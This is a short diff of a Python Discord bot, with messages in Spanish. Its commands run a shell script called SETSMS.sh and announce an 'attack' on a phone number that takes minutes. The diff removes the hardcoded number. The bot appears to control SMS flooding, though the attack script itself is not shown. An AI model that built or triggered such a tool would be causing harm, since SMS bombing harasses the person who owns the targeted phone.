@@ -38,8 +38,7 @@ async def on_message(message):
     if message.content.startswith('!SETSMS'):
         os.system("cd SETSMS ; bash SETSMS.sh")
         await message.channel.send("esta en SETSMS!")
-
-    numero = ("+573222222222")
+	
     if message.content.startswith('!atack'):
         await message.channel.send(f"se ataco a : {numero} se demora unos 3-4 minutos")
 
